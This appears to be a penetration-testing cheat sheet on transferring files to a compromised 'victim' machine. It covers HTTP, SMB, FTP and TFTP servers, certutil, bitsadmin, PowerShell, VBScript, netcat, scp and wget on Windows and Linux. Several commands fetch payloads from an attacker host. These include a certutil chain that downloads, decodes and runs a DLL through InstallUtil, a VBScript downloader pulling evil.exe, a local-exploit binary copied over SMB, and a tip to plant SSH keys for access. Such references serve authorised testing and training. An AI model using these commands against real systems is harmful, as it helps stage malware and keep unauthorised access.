---
description: Download files to the victim machine
---

# Downloading/Transfer files

## Simple Local Web Servers

<table>
  <thead>
    <tr>
      <th style="text-align:left">Command</th>
      <th style="text-align:left">Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align:left">python -m SimpleHTTPServer 80</td>
      <td style="text-align:left">Run a basic http server, great for serving up shells etc</td>
    </tr>
    <tr>
      <td style="text-align:left">python3 -m http.server</td>
      <td style="text-align:left">Run a basic Python3 http server, great for serving up shells etc</td>
    </tr>
    <tr>
      <td style="text-align:left">
        <p>ruby -rwebrick -e &quot;WEBrick::HTTPServer.new</p>
        <p>(:Port =&gt; 80, :DocumentRoot =&gt; Dir.pwd).start&quot;</p>
      </td>
      <td style="text-align:left">Run a ruby webrick basic http server</td>
    </tr>
    <tr>
      <td style="text-align:left">php -S 0.0.0.0:80</td>
      <td style="text-align:left">Run a basic PHP http server</td>
    </tr>
  </tbody>
</table>

## Updog

Link: [https://github.com/sc0tfree/updog ](https://github.com/sc0tfree/updog%20)

Updog is a replacement for Python's SimpleHTTPServer. It allows uploading and downloading via HTTP/S, can set ad hoc SSL certificates and use http basic auth.

Install using pip:

`pip3 install updog`

### Usage

`updog [-d DIRECTORY] [-p PORT] [--password PASSWORD] [--ssl]`

## SMTP Server

Link: [https://github.com/hackerscrolls/simplesmtp](https://github.com/hackerscrolls/simplesmtp)

Usage: `go run simplesmtp.go -save -i 0.0.0.0 -p 25`

## Windows

### curl 

Since Win10 1809 there is a build in curl  

```text
C:\Users\IEUser>curl.exe 
curl: try 'curl --help' for more information 
C:\Users\IEUser>curl.exe google.com/robots.txt 
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"> 
<html><head> 
<title>301 Moved Permanently</title> 
</head><body> 
<h1>Moved Permanently</h1> 
<p>The document has moved <a href="http://www.google.com/robots.txt">here</a>.</p> 
<hr> 
</body></html> 
C:\Users\IEUser> 
```

### wget

Wget is alias to Invoke-WebRequest in powershell

```text
PS C:\Users\Idan> wget google.com/robots.txt


StatusCode        : 200
StatusDescription : OK
Content           : User-agent: *
                    Disallow: /search
                    Allow: /search/about
                    Allow: /search/static
                    Allow: /search/howsearchworks
                    Disallow: /sdch
                    Disallow: /groups
                    Disallow: /index.html?
                    Disallow: /?
                    Allow: /?hl=
                    Disallow: /?...
RawContent        : HTTP/1.1 200 OK
                    Vary: Accept-Encoding
                    X-Content-Type-Options: nosniff
                    X-XSS-Protection: 0
                    Alt-Svc: quic=":443"; ma=2592000; v="46,43",h3-Q050=":443"; ma=2592000,h3-Q049=":443";
                    ma=2592000,h3-Q048=...
Forms             : {}
Headers           : {[Vary, Accept-Encoding], [X-Content-Type-Options, nosniff], [X-XSS-Protection, 0], [Alt-Svc,
                    quic=":443"; ma=2592000; v="46,43",h3-Q050=":443"; ma=2592000,h3-Q049=":443";
                    ma=2592000,h3-Q048=":443"; ma=2592000,h3-Q046=":443"; ma=2592000,h3-Q043=":443";
                    ma=2592000,h3-T050=":443"; ma=2592000]...}
Images            : {}
InputFields       : {}
Links             : {}
ParsedHtml        : mshtml.HTMLDocumentClass
RawContentLength  : 7004

```

View just content:

```text
Invoke-WebRequest 'http://google.com/robots.txt' | Select-Object -Expand Content
```

### PS iwr

alias to Invoke-WebRequest

`iwr google.com/robots.txt`

### bitsadmin

Use bitsadmin to download via the command line on older version of windows \(works from CMD.exe\)

usage:

`cmd.exe /c bitsadmin /transfer {JOB NAME} /download /priority normal {LINK} {DOWNLOAD LOCATION}`

example:

```text
bitsadmin /transfer debjob /download /priority normal http://cdimage.debian.org/debian-cd/current-live/i386/iso-hybrid/debian-live-8.7.1-i386-xfce-desktop.iso D:\Users\[Username]\Downloads\debian-live-8.7.1-i386-xfce-desktop.iso
```

credit: [https://gist.github.com/rosswd/cad64650ca1b03bd1789a69edbeb586c](https://gist.github.com/rosswd/cad64650ca1b03bd1789a69edbeb586c)

### PS WebClient

```text
(new-object System.Net.WebClient).DownloadFile('http://www.xyz.net/file.txt','C:\tmp\file.txt')
```

### Certutil

You can download the file directly:

```csharp
certutil.exe -urlcache -f http://192.168.0.1/file.exe file.exe
```

Or you can encode the file in base64 and then use `certutil` to decode it.

```text
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.dll & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll
```

### FTP

On a linux host start a FTP:

```text
apt-get install python3-pyftpdlib  
python3 -m pyftpdlib -p 21 -w
```

Or use metasploit:

```text
msf > use auxiliary/server/ftp
```

Write to the file the commands on the victim:

```text
echo open 192.168.1.101 21> ftp.txt
echo USER N7WERA>> ftp.txt
echo NEWERA_PASSWORD>> ftp.txt
echo bin>> ftp.txt
echo GET winpease.exe>> ftp.txt
echo bye>> ftp.txt
```

run from cmd or powershell:

`ftp -s ftp.txt`

### SMB Server

Start smb server on Kali \(or any linux\) using impacket:

```text
root@kali# smbserver.py -smb2support {SHARE NAME} {FOLDER TO SHARE} -username newera -password newera
```

From the victim:

```text
C:\>net use \\10.11.0.XXX\smb /user:<username> <password>
The command completed successfully. 
```

Copy files: 

```text
C:\WINDOWS\Temp>copy \\10.11.0.XXX\smb\ms11-046.exe \windows\temp\a.exe 
copy \\10.11.0.XXX\smb\ms11-046.exe \windows\temp\a.exe 
        1 file(s) copied.
```

###  TFTP Server

Start TFTP on Kali:

```text
service atftpd start
atftpd --daemon --port 69 /tftp
```

Download files from the victim:

```text
tftp -i 192.168.0.1 GET winpeas.txt
```

### VBScript <a id="vbscript"></a>

Here is a good script to make a wget-clone in VB.

If it doesn't work try piping it through unix2dos before copying it.

```text
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET",strURL,False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

You then execute the script like this:

```text
cscript wget.vbs http://192.168.10.5/evil.exe evil.exe
```

### NC.exe

You can download a standalone compiled version of NC \(Netcat\) for windows from the nmap project \([https://svn.nmap.org/nmap/ncat/](https://svn.nmap.org/nmap/ncat/)\), or use the kali compiled version, located in:

`/usr/share/windows-binaries/nc.exe`

If you're able to move the ncat to the victim you can use the normal nc functions to transfer more files \(or gain a shell..\)

On the attacker host:

```text
nc 192.168.0.10 4444 < file.exe
```

On the victim:

```text
ncat.exe -lvp 4444 > file.exe
```

## Linux

### scp

A built in SSH utility to trasfer files. once you gained access to the victim you can add a your pulic key to `.ssh/authorized_keys` or use credentials if found

Using public/private key - once a public key was copied to the victim .ssh folder, you can transfer files from the attacker to the victim by running:

`scp file.exe -i id_rsa user@victim:/tmp/`

The file will be transferred to the `/tmp` folder.

If you gained crednetials remove the `-i id_rsa` and login with the same command as above.

### wget 

wget is used to download files to the victim, run a web sever on the attacker by running:

```text
python3 -m http.server
```

and download from the victim:

```text
wget 192.168.0.1:8080/linenum.sh
```

### curl 

Curl is used to view web server source code, we can download files by running

```text
 curl https://url -o output.file.name
```

### ftp

linux has a build in ftp utility, first created a listerner on the attacker host:

```text
apt-get install python-pyftpdlib  
python -m pyftpdlib -p 21 -w
```

Or use metasploit:

```text
msf > use auxiliary/server/ftp
```

and then connect from the victim using

```text
ftp 192.168.0.1
```

### nc

A lot of unix systems have a build in nc utility which can be used to transfer files, same way as in windows.

You can download a compiled version of nc to unix from:

[https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86\_64/ncat](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/ncat)





